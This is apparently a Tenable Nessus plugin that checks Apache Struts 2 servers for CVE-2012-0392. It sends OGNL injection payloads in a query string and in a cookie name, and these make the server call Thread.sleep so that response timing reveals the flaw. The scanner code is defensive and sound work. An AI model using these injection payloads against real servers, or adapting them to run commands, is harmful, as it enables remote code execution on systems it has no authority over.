#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(57691);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2017/01/30 19:28:01 $");

  script_cve_id("CVE-2012-0392");
  script_bugtraq_id(51257);
  script_osvdb_id(78108);
  script_xref(name:"EDB-ID", value:"18329");

  script_name(english:"Apache Struts 2 Multiple Remote Code Execution and File Overwrite Vulnerabilities (safe check)");
  script_summary(english:"Fingerprints the vulnerability by doing multiple sleeps.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A remote web application uses a framework that is affected by code
execution and file overwrite vulnerabilities."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web application appears to use Struts 2, a web framework
that uses XWork. Due to flaws in multiple Struts2 'Interceptor'
classes (CookieInterceptor, ParametersInterceptor, and
DebuggingInterceptor) that fail to properly sanitize user-supplied
input, a remote attacker can run arbitrary Java code or overwrite
files on the remote host by sending a specially crafted HTTP request."
  );
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-008.html");
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to Struts2 2.3.1.1 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/11/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/01/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 8080, 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = eregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = eregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = eregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

if (max_index(urls) == 0)
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);

secs = make_list(5, 10, 20);
vuln_actions = make_list();

foreach dir (urls)
{
  # assume the action is vulnerable unless proven otherwise
  vuln = TRUE;
  cookie_test = FALSE;

  for (i = 0; i < max_index(secs) && vuln; i++)
  {
    millis = secs[i] * 1000;
    ognl_get = 'debug=command&expression=' +
    '%23_memberAccess["allowStaticMethodAccess"]=true,' +
    '@java.lang.Thread@sleep(' + millis + ')';

    url = dir + '?' + ognl_get;
    http_set_read_timeout(secs[i] * 2);
    then = unixtime();
    res = http_send_recv3(
      method:'GET',
      item:url,
      port:port,
      exit_on_fail:TRUE
    );
    now = unixtime();

    # if it looks like this action isn't vulnerable, move on to checking
    # the next one
    if ( now - then < secs[i] || now - then > (secs[i]+5) ) vuln = FALSE;

  }
  if (vuln) break;

  vuln = TRUE;
  cookie_test = TRUE;
    
  for (i = 0; i < max_index(secs) && vuln; i++)
  {
    millis = secs[i] * 1000;

    ognl_cookie = '(#_memberAccess["allowStaticMethodAccess"]\\u003dtrue)' +
    '(x)=1; x[@java.lang.Thread@sleep(' + millis + ')]';

    set_http_cookie(name: ognl_cookie, value: "1");
    
    url = dir;
    
    http_set_read_timeout(secs[i] * 2);
    then = unixtime();
    res = http_send_recv3(
      method:'GET',
      item:url,
      port:port,
      exit_on_fail:TRUE
    );
    now = unixtime();

    # if it looks like this action isn't vulnerable, move on to checking
    # the next one
    if ( now - then < secs[i] || now - then > (secs[i]+5) ) vuln = FALSE;
  }   
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

if (report_verbosity > 0)
{
  report = 
  'Nessus has determined a struts 2 application is affected by\n'+
  'forcing it to sleep() before sending the server\'s response.\n'+
  'This was verified using the following :';

  if(cookie_test)
    report += '  http request :\n\n' + http_last_sent_request() + '\n'; 
  else  
    report += '  url :\n\n' + '  ' + build_url(qs:url, port:port) + '\n';
      
  report +=
  '\nPlease note Nessus stopped after detecting the first affected\n'+
  'application.';

  security_hole(port:port, extra:report);
}
else security_hole(port);
